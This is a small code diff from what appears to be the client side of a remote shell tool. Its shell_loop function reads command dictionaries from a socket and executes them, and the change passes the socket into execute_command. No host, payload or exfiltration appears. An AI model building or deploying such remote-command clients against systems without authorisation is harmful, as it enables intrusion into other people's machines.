@@ -47,7 +47,7 @@ def shell_loop(sock):
                 break
             if not isinstance(command_data, dict) or 'cmd' not in command_data:
                 continue
-            if execute_command(command_data):
+            if execute_command(command_data, sock):
                 return True
         except Exception as e:
             print(f"[!] Error in client shell_loop: {e}")
